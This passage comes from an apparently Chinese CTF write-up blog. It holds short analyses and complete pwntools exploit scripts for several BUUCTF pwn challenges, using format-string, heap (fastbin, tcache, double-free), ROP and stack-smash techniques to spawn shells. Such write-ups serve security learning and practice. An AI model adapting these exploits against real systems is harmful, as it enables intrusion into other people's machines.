6*0x4</span><br><span class="line"></span><br><span class="line">	payload &#x3D; &quot;%.&quot; + str(ret_addr % 0x10000) + &quot;d%23$hn&quot;</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	payload &#x3D; &quot;%.&quot; + str(0xA170) + &quot;d%59$hn&quot;</span><br><span class="line">	payload &#x3D; payload.ljust(4*4,&quot;\x00&quot;)</span><br><span class="line">	payload +&#x3D; asm(shellcraft.i386.sh())</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sleep(0.2)</span><br><span class="line">	sh.sendline(&quot;hello&quot;)</span><br><span class="line">	log.success(&quot;ebp: &quot; + hex(ebp))</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20151,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x25-judgement-mna-2016">0x25 judgement_mna_2016</h2>
<h3 id="导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过-xx-s来读取文本">导入IDA发现存在典型的格式化溢出漏洞，且栈内分布指向flag的指针，可以通过$xx%s来读取文本</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;judgement_mna_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;judgement_mna_2016&quot;)</span><br><span class="line"></span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	payload &#x3D; &quot;%28$s&quot;</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20077,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x26-ciscn-nw-4">0x26 ciscn_nw_4</h2>
<h3 id="1、经过ida分析存在double-free，且show没有check，所以可以leak-heap-base和libc">1、经过ida分析存在double free，且show没有check，所以可以leak heap_base和libc</h3>
<h3 id="2、通过fastbin-attack修改unsorted-bin’s-bk，在-free-hook处伪造fake-chunk，然后再用double-free-fastbin-attack修改-free-hook的值为system，然后释放content为-bin-sh-x00的chunk即可">2、通过fastbin attack修改unsorted bin’s bk，在__free_hook处伪造fake_chunk，然后再用double free fastbin attack修改__free_hook的值为system，然后释放content为/bin/sh\x00的chunk即可</h3>
<h3 id="最终因为ubuntu16-04的环境问题拿不到flag，经过分析发现，是因为system函数里存在sub-rsp-0xNNN，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃">最终因为ubuntu16.04的环境问题拿不到flag，经过分析发现，是因为system函数里存在<code>sub rsp,0xNNN</code>，其中NNN很大，导致后面有一个cmp指令读取到了不可读区段导致程序崩溃</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_nw_4&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def inputName(name):</span><br><span class="line">	sh.recvuntil(&quot;what is your name?&quot;)</span><br><span class="line">	sh.send(name)</span><br><span class="line">def add(size,content):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	sh.recvuntil(&quot;size?&quot;)</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">	sh.recvuntil(&quot;content?&quot;)</span><br><span class="line">	sh.send(content)</span><br><span class="line">def show(idx):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;3&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index ?&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def free(idx):</span><br><span class="line">	sh.recvuntil(&quot;&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;2&quot;)</span><br><span class="line">	sh.recvuntil(&quot;index ?\n&quot;)</span><br><span class="line">	sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_nw_4&quot;)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&quot;)</span><br><span class="line">		main_arena_offset &#x3D; 0x3C4B20</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">		lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x64_libc.so.6&quot;)</span><br><span class="line">		main_arena_offset &#x3D; 0x3C4B20</span><br><span class="line">	inputName(&quot;fuck&quot;)</span><br><span class="line">	#leak libc</span><br><span class="line">	add(0x80,&quot;\x11&quot;*0x80) #idx 0</span><br><span class="line">	add(0x18,&quot;\x12&quot;*0x18) #idx 1</span><br><span class="line">	free(0)</span><br><span class="line">	show(0)</span><br><span class="line">	main_arena &#x3D; u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;)) - 88</span><br><span class="line">	libc &#x3D; main_arena - main_arena_offset</span><br><span class="line">	system &#x3D; libc + lib.symbols[&#39;system&#39;]</span><br><span class="line">	execl &#x3D; libc + lib.symbols[&#39;execl&#39;]</span><br><span class="line">	execve &#x3D; libc + lib.symbols[&#39;execve&#39;]</span><br><span class="line">	add(0x80,&quot;\x13&quot;*0x80) #idx 2 junk chunk</span><br><span class="line">	</span><br><span class="line">	#leak heap base</span><br><span class="line">	payload &#x3D; p64(0)*11 + p64(0x71)</span><br><span class="line">	add(0x60,&quot;\x14&quot;*0x60) #idx 3</span><br><span class="line">	add(0x60,payload) #idx 4</span><br><span class="line"></span><br><span class="line">	free(3)</span><br><span class="line">	free(4)</span><br><span class="line">	show(4)</span><br><span class="line">	heap_base &#x3D; (u64(sh.recvuntil(&quot;\x0a\x2d\x2d&quot;,True).ljust(8,&quot;\x00&quot;)) &gt;&gt; 16) &lt;&lt; 8</span><br><span class="line"></span><br><span class="line">	#modify unsorted bin&#39;s bk</span><br><span class="line">	unsorted_bin_attack_addr &#x3D; main_arena - (0x7f7506f49b20 - 0x7f7506f4b768) - 0x8</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	add(0x80,&quot;\x16&quot;*0x80) #idx 5</span><br><span class="line">	add(0x18,&quot;$0\x00&quot;) #idx 6</span><br><span class="line"></span><br><span class="line">	free(5)</span><br><span class="line">	free(3)</span><br><span class="line"></span><br><span class="line">	add(0x60,p64(heap_base + 0x180)) #idx 7</span><br><span class="line">	add(0x60,p64(heap_base + 0x180)) #idx 8	</span><br><span class="line">	add(0x60,p64(heap_base + 0x180)) #idx 9</span><br><span class="line"></span><br><span class="line">		#fastbin attack</span><br><span class="line">	payload &#x3D; p64(0) + p64(0x91) + p64(main_arena + 88) + p64(unsorted_bin_attack_addr)</span><br><span class="line">	add(0x60,payload)#idx 10</span><br><span class="line"></span><br><span class="line">	add(0x80,p64(0xdeadbeef))#idx 11</span><br><span class="line">	</span><br><span class="line">	free(7)</span><br><span class="line">	free(8)</span><br><span class="line">	free(9)</span><br><span class="line"></span><br><span class="line">	#fastbin attack modify __free_hook</span><br><span class="line">	add(0x60,p64(unsorted_bin_attack_addr + 0x10 - 0x3)) #idx 12</span><br><span class="line">	add(0x60,p64(unsorted_bin_attack_addr + 0x10 - 0x3)) #idx 13	</span><br><span class="line">	add(0x60,p64(unsorted_bin_attack_addr + 0x10 - 0x3)) #idx 14</span><br><span class="line"></span><br><span class="line">	payload  &#x3D; &quot;\x00&quot;*3 + p64(0) * 5 + p64(execve)</span><br><span class="line">	add(0x60,payload)</span><br><span class="line">	#input()</span><br><span class="line">	free(6)</span><br><span class="line">	log.success(&quot;heap_base: &quot; + hex(heap_base))</span><br><span class="line">	log.success(&quot;libc: &quot; + hex(libc))</span><br><span class="line">	log.success(&quot;main_arena: &quot; + hex(main_arena))</span><br><span class="line">	log.success(&quot;system: &quot; + hex(system))</span><br><span class="line">	log.success(&quot;unsorted_bin_attack_addr: &quot; + hex(unsorted_bin_attack_addr))</span><br><span class="line">	log.success(&quot;execl: &quot; + hex(execl))</span><br><span class="line">	#x&#x2F;50gx (long long)(&amp;main_arena) - 0x1b</span><br><span class="line">	#x&#x2F;50gx (long long)(&amp;__free_hook) - 0x50</span><br><span class="line">	#execl  execlexecle</span><br><span class="line">	#x&#x2F;50gx *0x6020C0</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	#buuoj.cn 20149</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20149,1)</span><br></pre></td></tr></table></figure>
<h2 id="0x27-checker-seccon-2016">0x27 checker_seccon_2016</h2>
<h3 id="首先这题开启了canary，且代码无法leak-canary，导致无法溢出">首先这题开启了canary，且代码无法leak canary，导致无法溢出</h3>
<h3 id="考虑开启了canary，且存在无限输入，但是输入中遇到-x00会截断，所以考虑使用smash来leak任意地址数据">考虑开启了canary，且存在无限输入，但是输入中遇到\x00会截断，所以考虑使用smash来leak任意地址数据</h3>
<h3 id="由于遇到-x00截断或遇到换行截断并替换为-x00，我们可以考虑先输入-xc0-x10-x60-x11-x11-x11，然后再输入-xc0-x10-x60-x11-x11，直到-xc0-x10-x60">由于遇到\x00截断或遇到换行截断并替换为\x00，我们可以考虑先输入\xc0\x10\x60\x11\x11\x11，然后再输入\xc0\x10\x60\x11\x11，直到\xc0\x10\x60</h3>
<h3 id="如何找到argv-0-，只需调试器附加运行的程序，然后找到-文件名的字符串即可，比如我这里是-checker-seccon-2016，然后将flag的地址覆盖进去即可">如何找到argv[0]，只需调试器附加运行的程序，然后找到<code>./文件名</code>的字符串即可，比如我这里是<code>./checker_seccon_2016</code>，然后将flag的地址覆盖进去即可</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;checker_seccon_2016&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;checker_seccon_2016&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	sh.recvuntil(&quot;Hello! What is your name?\nNAME : &quot;)</span><br><span class="line">	sh.sendline(&quot;fuckyou&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Do you know flag?\n&gt;&gt; &quot;)</span><br><span class="line">	payload  &#x3D; &quot;\xaa&quot; * 376</span><br><span class="line">	payload +&#x3D; &quot;\xc0\x10\x60&quot;</span><br><span class="line">	sh.sendline(payload+&quot;\x11\x11\x11&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Do you know flag?\n&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(payload+&quot;\x11\x11&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Do you know flag?\n&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(payload+&quot;\x11&quot;)</span><br><span class="line">	sh.recvuntil(&quot;Do you know flag?\n&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recvuntil(&quot;Do you know flag?\n&gt;&gt; &quot;)</span><br><span class="line">	sh.sendline(&quot;yes&quot;)</span><br><span class="line">	sh.recvuntil(&quot;\nOh, Really??\nPlease tell me the flag!\nFLAG : &quot;)</span><br><span class="line">	sh.sendline(&quot;fuckyou&quot;)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;buuoj.cn&quot;,20066,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x28-ciscn-2019-ne-5">0x28 ciscn_2019_ne_5</h2>
<h3 id="典型的ROP题，ret2text">典型的ROP题，ret2text</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;i386&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_2019_ne_5&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_2019_ne_5&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	sh.recv()</span><br><span class="line">	sh.sendline(&#39;administrator&#39;)</span><br><span class="line">	sh.recvuntil(&#39;0.Exit\n:&#39;)</span><br><span class="line">	offset &#x3D; 76</span><br><span class="line">	binsh &#x3D; 0x080482E6 + 0x4</span><br><span class="line">	sh.sendline(&quot;1&quot;)</span><br><span class="line">	payload &#x3D; offset * &#39;a&#39; + p32(elf.plt[&#39;system&#39;]) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">	sh.recvuntil(&#39;Please input new log info:&#39;)</span><br><span class="line">	sh.sendline(payload)</span><br><span class="line">	sh.recvuntil(&quot;0.Exit\n:&quot;)</span><br><span class="line">	sh.sendline(&quot;4&quot;)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;f.buuoj.cn&quot;,20171,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x29-ciscn-2019-es-2">0x29 ciscn_2019_es_2</h2>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_s_4&quot;)</span><br><span class="line">lib &#x3D; ELF(&quot;&#x2F;home&#x2F;pig&#x2F;Pig&#x2F;CTF&#x2F;BUUCTF&#x2F;BUUCTF_libc&#x2F;x86_libc.so.6&quot;)</span><br><span class="line">#nc 172.29.9.107 9999 </span><br><span class="line"></span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	if(debug &#x3D;&#x3D; 1):</span><br><span class="line">		sh &#x3D; process(&quot;.&#x2F;ciscn_s_4&quot;)</span><br><span class="line">	else:</span><br><span class="line">		sh &#x3D; remote(ip,port)</span><br><span class="line">	pop3_ret &#x3D; 0x08048699</span><br><span class="line">	pop2_ret &#x3D; 0x0804869a</span><br><span class="line">	offset &#x3D; 44</span><br><span class="line">	main_addr &#x3D; 0x080485FF</span><br><span class="line">	payload &#x3D; (offset-12) * &#39;a&#39; + p32(0x0804A01C) + &quot;2&quot;*4 + &quot;3&quot;*4+ p32(main_addr)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	payload &#x3D; (offset-0x10) * &quot;b&quot;+&quot;5&quot;*4 +p32(0x0804A01C)+&quot;7&quot;*4+&quot;8&quot;*4 +p32(0x0804861D)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(payload)</span><br><span class="line">	sh.recv(33-4-4)</span><br><span class="line">	libc &#x3D; u32(sh.recv(4)) - lib.symbols[&quot;__libc_start_main&quot;]</span><br><span class="line">	log.success(&quot;libc :&quot; + hex(libc))</span><br><span class="line">	system &#x3D; 0x08048559</span><br><span class="line">	binsh &#x3D; libc + next(lib.search(&quot;&#x2F;bin&#x2F;sh&quot;))</span><br><span class="line">	log.success(&quot;binsh :&quot;+hex(binsh))</span><br><span class="line">	log.success(&quot;system :&quot;+hex(libc + lib.symbols[&#39;system&#39;]))</span><br><span class="line">	#input()</span><br><span class="line">	payload &#x3D; (offset)*&quot;a&quot; + p32(0x08048450)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	payload &#x3D; (offset-12) * &#39;a&#39; + p32(binsh) + &quot;2&quot;*4 + &quot;3&quot;*4+ p32(main_addr)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	payload &#x3D; (offset-0x10) * &quot;b&quot;+&quot;5&quot;*4 +p32(binsh)+&quot;7&quot;*4+&quot;8&quot;*4 +p32(system)</span><br><span class="line">	sh.send(payload)</span><br><span class="line">	#sh.recvuntil(&quot;Hello, &quot;)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">	pwn(&quot;f.buuoj.cn&quot;,20174,0)</span><br></pre></td></tr></table></figure>
<h2 id="0x30-ciscn-2019-final-3">0x30 ciscn_2019_final_3</h2>
<h3 id="这题总体不难，由于tcache-attack的利用很方便，所以这题只要leak-libc就可以轻而易举拿到shell">这题总体不难，由于tcache attack的利用很方便，所以这题只要leak libc就可以轻而易举拿到shell</h3>
<h3 id="简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache-attack修改-free-hook拿到shell">简单的思路：先合并堆块，合并后的堆块大于tcache的范围，然后free掉即可出现libc，接下来就是堆块重叠malloc一个堆块到libc空间，通过gift得到libc地址，接着tcache attack修改__free_hook拿到shell</h3>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level &#x3D; &quot;debug&quot;</span><br><span class="line">context.arch &#x3D; &quot;amd64&quot;</span><br><span class="line">elf &#x3D; ELF(&quot;ciscn_final_3&quot;)</span><br><span class="line">sh &#x3D; 0</span><br><span class="line">lib &#x3D; 0</span><br><span class="line">def add(idx,size,content):</span><br><span class="line">    sh.recvuntil(&quot;choice &gt; &quot;)</span><br><span class="line">    sh.sendline(&quot;1&quot;)</span><br><span class="line">    sh.recvuntil(&quot;input the index&quot;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">    sh.recvuntil(&quot;input the size&quot;)</span><br><span class="line">    sh.sendline(str(size))</span><br><span class="line">    sh.recvuntil(&quot;now you can write something&quot;)</span><br><span class="line">    sh.send(content)</span><br><span class="line">    sh.recvuntil(&quot;gift :0x&quot;)</span><br><span class="line">    return int(sh.recvuntil(&quot;\n&quot;,True),16)</span><br><span class="line">def free(idx):</span><br><span class="line">    sh.recvuntil(&quot;choice &gt; &quot;)</span><br><span class="line">    sh.sendline(&quot;2&quot;)</span><br><span class="line">    sh.recvuntil(&quot;input the index&quot;)</span><br><span class="line">    sh.sendline(str(idx))</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">    global sh</span><br><span class="line">    global lib</span><br><span class="line">    if(debug &#x3D;&#x3D; 1):</span><br><span class="line">        sh &#x3D; process(&quot;.&#x2F;ciscn_final_3&quot;)</span><br><span class="line">        lib &#x3D; ELF(&#39;libc.so.6&#39;)</span><br><span class="line">    else:</span><br><span class="line">        sh &#x3D; remote(ip,port)</span><br><span class="line">        lib &#x3D; ELF(&#39;libc.so.6&#39;)</span><br><span class="line">    addr1 &#x3D; add(0,0x78,&quot;\x11&quot; * 0x78)</span><br><span class="line">    heap_base &#x3D; addr1 - 0x11E70</span><br><span class="line">    addr2 &#x3D; add(1,0x0,&#39;&#39;)</span><br><span class="line">    add(2,0x78,&#39;\x33&#39; * 0x78)</span><br><span class="line">    add(3,0x78,&#39;\x44&#39; * 0x78)</span><br><span class="line">    add(4,0x78,&#39;\x55&#39; * 0x78)</span><br><span class="line">    add(5,0x78,&#39;\x66&#39; * 0x78)</span><br><span class="line">    add(6,0x78,&#39;\x77&#39; * 0x78)</span><br><span class="line">    add(7,0x78,&#39;\x88&#39; * 0x78)</span><br><span class="line">    add(8,0x78,&#39;&#x2F;bin&#x2F;sh\x00&#39;)</span><br><span class="line">    add(9,0x78,&#39;\xaa&#39; * 0x78)</span><br><span class="line">    add(10,0x78,&#39;\xaa&#39; * 0x78)</span><br><span class="line">    add(11,0x78,&#39;\xbb&#39; * 0x78)</span><br><span class="line">    free(11)</span><br><span class="line">    free(11)</span><br><span class="line">    add(12,0x78,p64(addr1 - 0x10))</span><br><span class="line">    add(13,0x78,p64(addr1 - 0x10))</span><br><span class="line">    add(14,0x78,p64(0) + p64(0x4A1))</span><br><span class="line">    free(0)</span><br><span class="line">    free(1)</span><br><span class="line">    add(15,0x78,&#39;\xaa&#39; * 0x78)</span><br><span class="line">    add(16,0,&#39;&#39;)</span><br><span class="line">    main_arena &#x3D; add(17,0,&#39;&#39;)</span><br><span class="line">    libc &#x3D; main_arena - 0x3EBCA0</span><br><span class="line">    __free_hook &#x3D; libc + lib.symbols[&#39;__free_hook&#39;]</span><br><span 